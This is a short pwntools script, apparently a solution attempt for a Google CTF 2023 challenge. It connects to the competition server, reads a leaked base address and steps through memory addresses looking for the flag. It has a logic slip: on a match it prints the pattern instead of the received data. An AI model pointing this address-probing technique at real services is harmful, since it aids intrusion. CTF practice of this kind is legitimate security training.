from pwn import *
import time
import re

p = remote('wfw1.2023.ctfcompetition.com', 1337)
p.recvuntil('shot.\n')

# Get base address
base_address = p.recvn(12)
address_len = 8

p.recv()

# convert to int
int_base = int(base_address, 16)
print('Integer: ', int_base)
print('Hex: ', hex(int_base))

while True:
    # Send payload
    print('Hex: ', hex(int_base))
    p.sendline((hex(int_base) + ' 8'))
    data = p.recv()
    flag = rb'CTF'
    if re.search(flag, data):
        print(flag)

    # Increment
    int_base += 8
    time.sleep(1)

p.interactive()
